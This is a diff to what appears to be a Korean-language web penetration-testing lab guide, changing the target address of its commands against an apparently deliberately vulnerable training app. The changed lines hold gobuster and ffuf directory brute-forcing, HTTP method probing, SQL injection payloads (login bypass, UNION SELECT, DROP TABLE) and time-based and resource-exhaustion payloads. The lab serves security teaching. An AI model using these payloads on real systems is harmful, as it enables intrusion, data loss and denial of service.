@@ -182,7 +182,7 @@ PATHS=(
 )
 hits=0
 for p in "${PATHS[@]}"; do
-  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" -m 3 "http://10.20.30.80:3000/$p")
+  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" -m 3 "http://10.20.40.81:3000/$p")
   if [ "$code" != "404" ] && [ "$code" != "000" ]; then
     echo "  [$code ${size}B] /$p"
     [ "$code" = "200" ] && hits=$((hits+1))
@@ -217,8 +217,8 @@ echo "200 응답: $hits / ${#PATHS[@]} 경로"
 > **OSS 도구 — gobuster + ffuf**:
 >
 > ```bash
-> gobuster dir -u http://10.20.30.80:3000 -w /usr/share/wordlists/dirb/common.txt -t 50 -x bak,old,zip
-> ffuf -u http://10.20.30.80:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -fs 89
+> gobuster dir -u http://10.20.40.81:3000 -w /usr/share/wordlists/dirb/common.txt -t 50 -x bak,old,zip
+> ffuf -u http://10.20.40.81:3000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc 200,301,302,403 -fs 89
 > ```
 
 ---
@@ -231,7 +231,7 @@ echo "200 응답: $hits / ${#PATHS[@]} 경로"
 
 ```bash
 echo "=== nikto 스타일 보안 헤더 7종 점검 ==="
-HEADERS=$(curl -sI http://10.20.30.80:3000/)
+HEADERS=$(curl -sI http://10.20.40.81:3000/)
 echo "$HEADERS" | head -10
 echo "---"
 score=0
@@ -331,12 +331,12 @@ echo "=== 위험 HTTP 메서드 5종 점검 ==="
 
 # OPTIONS — 허용 메서드 노출 확인
 echo "[OPTIONS preflight 응답]"
-curl -sI -X OPTIONS http://10.20.30.80:3000/ | grep -iE "allow|access-control" | sed 's/^/  /'
+curl -sI -X OPTIONS http://10.20.40.81:3000/ | grep -iE "allow|access-control" | sed 's/^/  /'
 echo "---"
 
 printf "%-12s %-8s %s\n" "method" "code" "verdict"
 for method in PUT DELETE TRACE CONNECT PATCH; do
-  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://10.20.30.80:3000/)
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://10.20.40.81:3000/)
   v=""
   case "$code" in
     200|204) v="★ 허용 (위험)";;
@@ -388,7 +388,7 @@ echo "[1] /rest/products/search 페이로드 5종:"
 PAYLOADS=("' OR '1'='1" "1 UNION SELECT 1,2,3--" "1' AND SLEEP(2)--" "1; DROP TABLE test--" "admin'--")
 for payload in "${PAYLOADS[@]}"; do
   enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
-  read code time < <(curl -s -o /tmp/sqli.json -w "%{http_code} %{time_total}" "http://10.20.30.80:3000/rest/products/search?q=${enc}")
+  read code time < <(curl -s -o /tmp/sqli.json -w "%{http_code} %{time_total}" "http://10.20.40.81:3000/rest/products/search?q=${enc}")
   count=$(python3 -c "import json; d=json.load(open('/tmp/sqli.json')); print(len(d.get('data',[])))" 2>/dev/null || echo "?")
   printf "  %-30s code=%s time=%-6s items=%s\n" "$payload" "$code" "${time}s" "$count"
 done
@@ -396,7 +396,7 @@ done
 echo ""
 echo "[2] /rest/user/login 페이로드 3종:"
 for email in "' OR 1=1--" "admin'--" "' UNION SELECT 1,2,3,4,5,6,7,8,9--"; do
-  result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  result=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
     -H 'Content-Type: application/json' \
     -d "{\"email\":\"$email\",\"password\":\"test\"}")
   verdict=$(echo "$result" | python3 -c "
@@ -539,10 +539,10 @@ measure_time() {
   printf "  %-40s avg=%ss (n=%d)\n" "$label" "$avg" "$n"
 }
 
-measure_time "정상 (q=apple)"          "http://10.20.30.80:3000/rest/products/search?q=apple"
-measure_time "SLEEP(3) MySQL 페이로드"  "http://10.20.30.80:3000/rest/products/search?q=apple'+AND+SLEEP(3)--"
-measure_time "SQLite RANDOMBLOB 100MB"  "http://10.20.30.80:3000/rest/products/search?q=test%27%29%29AND+%28SELECT+CASE+WHEN%281%3D1%29+THEN+RANDOMBLOB%28100000000%29+ELSE+1+END%29--"
-measure_time "긴 입력 (10K char)"        "http://10.20.30.80:3000/rest/products/search?q=$(python3 -c 'print(\"A\"*10000)')"
+measure_time "정상 (q=apple)"          "http://10.20.40.81:3000/rest/products/search?q=apple"
+measure_time "SLEEP(3) MySQL 페이로드"  "http://10.20.40.81:3000/rest/products/search?q=apple'+AND+SLEEP(3)--"
+measure_time "SQLite RANDOMBLOB 100MB"  "http://10.20.40.81:3000/rest/products/search?q=test%27%29%29AND+%28SELECT+CASE+WHEN%281%3D1%29+THEN+RANDOMBLOB%28100000000%29+ELSE+1+END%29--"
+measure_time "긴 입력 (10K char)"        "http://10.20.40.81:3000/rest/products/search?q=$(python3 -c 'print(\"A\"*10000)')"
 ```
 
 **예상 출력**:
